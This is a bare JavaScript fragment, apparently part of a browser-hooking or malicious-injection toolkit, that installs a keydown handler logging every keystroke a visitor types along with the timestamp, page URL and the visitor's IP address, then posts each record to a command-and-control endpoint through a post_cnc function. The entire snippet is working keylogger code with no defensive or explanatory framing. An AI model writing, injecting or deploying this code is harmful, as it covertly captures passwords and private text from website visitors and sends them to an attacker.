document.onkeydown = function(e){
	let data = {
		"keylog": {
			timestamp: Date.now(),
			key: e.key,
			uri: window.location.href
		}
	};
	get_ips(
		function(ip){
			data.keylog.ip = ip;
			post_cnc(
				data,
				function(data){
					return true;
				}
			);
		}
	);
	return true;
};